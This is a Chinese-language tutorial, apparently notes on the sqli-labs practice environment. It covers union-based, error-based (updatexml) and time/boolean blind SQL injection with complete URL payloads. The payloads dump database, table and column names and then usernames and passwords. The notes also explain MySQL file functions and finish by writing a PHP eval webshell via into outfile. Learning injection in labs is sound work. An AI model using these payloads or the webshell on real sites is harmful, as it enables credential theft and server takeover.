sql注入2

可以通过输入不符合sql语法的语句得到页面上返回的报错信息从而推断出要闭合什么符号

例1

输入id=1”时页面返回报错信息

由此推断出闭合方式，输入?id=1”)--+

第一步 判断共有几列 输入id=1”) order by 4 --+时出现报错

第二步 爆出显示位

输入?id=-1”) union select 1,2,3 --+

第三步 爆出数据库和版本号

输入?id=-1”) union select 1,database(),version() --+

第四步 爆表

输入?id=-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’--+

第五步 爆字段名

输入?id=-1”) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+

第六步 得到敏感字段内容

输入?id=-1”) union select 1,2,group_concat(username,id,password) from users–+

函数

updatexml()

sql语法：updatexml(1,concat(0x7e,(select databases())0x7e),1)

如果存在注入则会出现报错，如：XPATH syntax error: testdb

可用于爆数据库名、爆表名、爆字段名

例如：and updatexml(1,concat(0x7e,user(),0x7e),1)

sleep()

sql语法：sleep(seconds)

作用：让数据库暂停指定秒数后再返回结果

例如 select sleep(5); 查询会等待5秒，然后返回

在sql注入中的作用：当页面没有回显，或没有报错，或没有明显变化就可以通过响应时间判断真假

例如 and sleep(5)--+ 如果页面明显慢了5秒，则存在注入

例2

任意给id传一个值，发现结果不回显

输入id=1’制造语法错误

发现语法报错存在，且可以判断出为单引号闭合

输入?id=1’ and sleep(5)–+ 发现页面明显延迟，说明判断正确

通过报错函数爆出数据库名

输入?id=-1’ and updatexml(1,concat(1,(database())),1)–+

爆表

输入?id=-1’ and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1)–+

爆字段名

输入?id=-1’ and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=’users’)),1)–+

length()函数

在sql注入中length函数常用于判断数据长度（用于盲注）

时间盲注示例: and if(length(database())=5,sleep(5),0)–+

如果页面延迟5秒则数据库名长度是5

布尔注入示例：and length(database())=5 –+

如果页面正确则数据库名长度是5

into dumpfile()

into dumpfile()是MYSQL的文件写入语法

select ‘内容’ into dumpfile ‘/路径/文件名’;

执行后在服务磁盘创建文件，把查询结果写进去

特点：不会自动加换行，不会自动分隔字段，更适合写WebShell，可以写二进制

into outfile()

作用：把查询结果写入服务器上的一个文件（文件是在服务器本地创建）

select ‘内容’ into outfile ‘/路径/文件名’;

load_file()

作用：用来读取服务器本地文件的内容，并作为字符串返回

select load_file(‘/path/file.txt’)

读取的是服务器本机磁盘文件

@@basedir()是安装MYSQL的安装路径，@@datadir()是安装MYSQL的数据文件路径

例3

制造sql语法错误，发现页面只显示对和错，输入?id=1”时页面显示正常，输入?id=1’时页面显示异常，初步判断为单引号闭合，输入?id=1’–+发现页面显示还是异常，说明不是简单的单引号闭合，输入?id=1’)–+发现页面还是异常，输入?id=1’))–+,页面显示正常，说明闭合方式是单引号加两个括号

输入?id=1’)) order by 1–+ 直到4出现报错说明有三个字段

通过into outfile函数写入一句话木马 输入?id=1’)) union select 1,”<?php eval($_REQUEST[1])?>”,3 into outfile “D://phpstudy_pro//WWW//sqli-labs//Less-7//shell.php”–+（意思是把一句话木马shell.php写到服务器绝对路径中）

用蚁剑连接即可
